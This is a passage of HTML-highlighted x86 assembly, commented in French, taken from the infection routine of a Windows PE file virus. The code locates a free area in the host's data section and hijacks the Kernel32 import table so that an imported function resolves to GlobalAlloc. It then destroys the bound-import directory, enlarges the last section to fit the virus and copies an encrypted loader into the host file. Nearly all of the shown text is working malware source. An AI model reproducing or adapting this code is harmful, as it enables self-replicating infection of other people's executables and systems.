</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">section_data_trouve</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_SECTION_HEADER</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">recherche_section_data</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc5">section_data_trouve</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">recherche_section_data</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">+</span><span class="sc5">sizeof.IMAGE_SECTION_HEADER</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">adr_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">recherche_section_data</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">recherche_section_data</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_espace_libre_sect_data_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">aligne</span><span class="sc0">

</span><span class="sc1">;[Fin de la localisation d'un espace vide dans la section 'data']</span><span class="sc0">



</span><span class="sc1">;[Recherche de le structure IMAGE_IMPORT_DESCRIPTOR dediee aux imports</span><span class="sc0">
</span><span class="sc1">;de Kernel32]:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_OPTIONAL_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">sizeof.IMAGE_OPTIONAL_HEADER</span><span class="sc4">+</span><span class="sc5">sizeof.IMAGE_DATA_DIRECTORY</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;esi pointe sur la structure IMAGE_DATA_DIRECTORY dediee a l'import:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc5">rva_vers_adr_map</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0">

</span><span class="sc5">recherche_k32_image_import_descriptor</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.ID_Name</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc5">rva_vers_adr_map</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'KERN'</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">recherche_k32_image_import_descriptor</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EL32'</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">recherche_k32_image_import_descriptor</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_IMAGE_IMPORT_DESCRIPTOR_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;[Fin de la recherche de la structure IMAGE_IMPORT_DESCRIPTOR]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">adr_image_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_1st_thunk_avant_infection_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc5">rva_vers_adr_map</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_1st_thunk_k32_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.ID_OriginalFirstThunk</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rva_orig_1st_thunk_avant_infection_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc5">rva_vers_adr_map</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_original_1st_thunk_k32_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">



</span><span class="sc1">;[Debut du calcul du nombre de fonctions de Kernel32 importees par le</span><span class="sc0">
</span><span class="sc1">;programme cible]:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasd</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nbre_fct_k32_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">TAILLE_LOADER</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">sizeof.IMAGE_THUNK_DATA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">nbre_octet_libre_sect_code_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_espace_libre_sect_code_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;[Fin du calcul du nombre de fonctions importees de Kernel32]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;[Recherche d'une fonction de Kernel32 importee par la cible</span><span class="sc0">
</span><span class="sc1">;dont le nom a au moins 11 symboles]:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">recherche_nom_fct_k32_cible</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">err_infection</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rva_IMAGE_IMPORT_BY_NAME_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc5">rva_vers_adr_map</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">eax.IBN_Name</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">recherche_nom_fct_k32_cible</span><span class="sc0">


</span><span class="sc1">;[Fin de la verification du fichier cible]</span><span class="sc0">



</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">index_fct_k32_altere_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">sz_nom_fct_k32_altere_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copie_chaine</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">sz_nom_globalalloc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copie_chaine</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;[Fin de la recherche d'une fonction de Kernel32 importee dont le nom a au</span><span class="sc0">
</span><span class="sc1">;moins 11 symboles]</span><span class="sc0">


</span><span class="sc1">;mov edi,[adr_map_espace_libre_sect_code_cible+ebp]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">adr_map_espace_libre_sect_data_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc5">adr_map_vers_rva</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">rva_IMAGE_IMPORT_BY_NAME_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">stosd</span><span class="sc0">       </span><span class="sc1">;la RVA de la structure IMAGE_IMPORT_BY_NAME de Kernel32 est</span><span class="sc0">
        </span><span class="sc1">;transferee dans la section code. La RVA de l'emplacement</span><span class="sc0">
        </span><span class="sc1">;contenant ceci sera la nouvelle valeur FirstThunk de la</span><span class="sc0">
        </span><span class="sc1">;cible.</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_IMPORT_DESCRIPTOR_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">           </span><span class="sc1">;construction OriginalFirstThunk</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">           </span><span class="sc1">;TimeDateStamp</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">           </span><span class="sc1">;ForwarderChain</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">;construction FirstThunk</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">adr_image_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ptr1_adr_globalalloc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ptr2_adr_globalalloc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">


</span><span class="sc1">;[Debut de la reconstruction de la table des thunk_data pointee par</span><span class="sc0">
</span><span class="sc1">;first_thunk]:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">adr_map_espace_libre_sect_code_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc5">adr_map_vers_rva</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">adr_image_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">nbre_fct_k32_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">adr_map_1st_thunk_k32_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">element_suivant_tab_thunk_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">element_suivant_tab_thunk_data</span><span class="sc0">

</span><span class="sc1">;[Fin de la reconstruction de la table]</span><span class="sc0">



</span><span class="sc1">;[Debut de la construction de la "table des push"]:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">adr_image_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc5">rva_vers_adr_map</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_loader_sect_code_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;[Determination de l'instruction PUSH qui va etre transferee]:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">struct_recherche</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">eax.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">DERNIER_3_BIT</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">

</span><span class="sc1">;[Fin de la determination]</span><span class="sc0">

</span><span class="sc5">element_suivant_table_push</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">element_suivant_table_push</span><span class="sc0">

</span><span class="sc1">;[Fin de la construction de la "table des push"]</span><span class="sc0">



</span><span class="sc1">;[Debut de la destruction de l'en-tete de la directory BOUND_IMPORT_DIRECTORY]:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_OPTIONAL_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">sizeof.IMAGE_OPTIONAL_HEADER</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">*</span><span class="sc5">sizeof.IMAGE_DATA_DIRECTORY</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc1">;[Fin de la destruction]</span><span class="sc0">


</span><span class="sc1">;[Debut de la routine de transfert des deux parties du virus]:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_FILE_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sizeof.IMAGE_SECTION_HEADER</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_SECTION_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc5">TAILLE_VIRUS_ALIGNE_FICHIER</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc5">TAILLE_VIRUS_ALIGNE_MEMOIRE</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">aligne</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">adr_map_IMAGE_OPTIONAL_HEADER_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc5">TAILLE_VIRUS_ALIGNE_MEMOIRE</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc5">adr_map_vers_rva</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">adr_image_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">adr_fin_derniere_sect_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">GEN_ALEATOIRE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">seed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">clef</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">adr_map_loader_sect_code_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">debut_loader</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">TAILLE_LOADER</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

